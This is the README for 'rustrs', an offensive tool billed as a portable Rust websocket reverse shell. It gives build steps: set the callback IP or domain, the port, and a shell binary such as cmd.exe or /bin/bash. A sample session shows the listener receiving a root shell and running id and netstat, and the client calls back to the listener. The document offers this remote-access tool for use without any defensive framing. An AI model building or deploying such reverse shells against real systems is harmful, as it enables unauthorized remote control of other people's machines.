# rustrs

portable rust based websocket reverse shell

**Compile**

- Update script: ip/domain, port, binary (cmd.exe, /bin/bash, etc)

```
root@kali:/opt/rustrs# cargo build
    Finished dev [unoptimized + debuginfo] target(s) in 0.02s
```

Build for target platform. 
- https://forge.rust-lang.org/release/platform-support.html

**Usage**

WebSocket Listener

```
root@kali:/opt/rustrs/target/debug# ./server 
waiting for new reverse websocket session..
new session started, connected.
$ id
uid=0(root) gid=0(root) groups=0(root)

$ netstat -pantwu
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1/init              
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      28346/./server      

```

WebSocket Client (reverse shell)

```
root@kali:/opt/rustrs/target/debug# ./client 

```

Enjoy~
